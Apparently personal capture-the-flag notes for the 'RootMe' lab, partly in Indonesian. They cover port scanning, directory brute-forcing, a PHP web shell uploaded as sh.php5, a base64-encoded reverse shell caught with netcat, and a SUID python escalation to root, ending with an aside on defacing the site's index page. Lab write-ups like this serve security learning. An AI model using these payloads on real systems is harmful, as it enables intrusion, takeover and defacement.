# root me
- tool: gobuster
- web: cyberchef, revshell, gtfgobins

## task 1
- deploy
- ip = 10.10.1.253

## task 2
- scan the machine how many ports are the open? 2
  - ```nmap -sC -sV 10.10.1.253 -oN ip.log```
  - -sC vulnerabilty, -sV verbose, -oN outputNormal, ip.log nama_file
- What version of Apache is running? 2.4.29
- What service is running on port 22? ssh
- Find directories on the web server using the GoBuster too? /panel/
  - ```gobuster dir -u http://10.10.1.253/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt```
    - gobuster =brute force direcotry tersembunyi pada situs web
    - dir = type directory
    - -u = destination url
    - -w = file worldlist

## task 3
- Getting a shell
  - open "http://10.10.1.253/panel" in browser
  - create some file php injection
    ```
    exmple PHP Injection Using eval() Function

    $myvar = "varname";
    $x = $_GET['arg'];
    eval("$myvar = $x;");
    ```
    ```<php echo system($_GET['c']); ?>``` in file sh.php5
  - open "http://10.10.1.253/uploads" and click sh.php5
  - add ```?c=ls``` in last url
- make revese shell
  - open cyberchef, revshell
    - revshell: add option ur ip ex: 10.10.1.1, and port 9001
    - copy Listener "nc -lvnp 9001" and paste in terminal
    - copy script: ncmkfifo 
    - open cyberchef: add to base64
    - paste script
    - copy script base64
  - and add url ```?c=echo script_base64_falkjfalkfgjalfa | base64 -d > shell.sh```
    ```
    ?c=chmod 777 shell.sh
    ?c=bash shell.sh
    ```
  - open terminal (dont forget paste listener before "bash shell.sh")
    - ```nc -lvnp 9001``` after that reverse connector is connect
    - $whoami
  - fiexd terminal
    - nampilin lokasi file, dan ubah variable terminal TERM menjadi xterm
    ```
    python3 -c "import pty; pty.spawn('/bin/bash')"
    export TERM=xterm
    ```
    - ctrl z
    ```
    stty raw -echo;fg;
            reset
    ```
  - find user.txt
    ```
    cd /var/www
    ls -la
    cat user.txt
    ```

## task 4
- Search for files with SUID permission, which file is weird?
  - use find
    ```
    find / -user root -perm /4000
    find / -perm /4000 2>dev/null
    find / -type f -name user.txt 2> /dev/null
    ```
    - find /usr/bin/python if have python u can use python in this terminal
  - find SUID in gtfobins
    - find: python SUID, and copy
    - ```python -c 'import os; os.execl("/bin/bash", "bash", "-p")'```
  - access root
    ```
    cd root
    ls -la
    cat root.txt
    ```
  - u can also change the website
    ```
    cd /var/www/html
    nano index.php
    systemctl restart apache2
    ```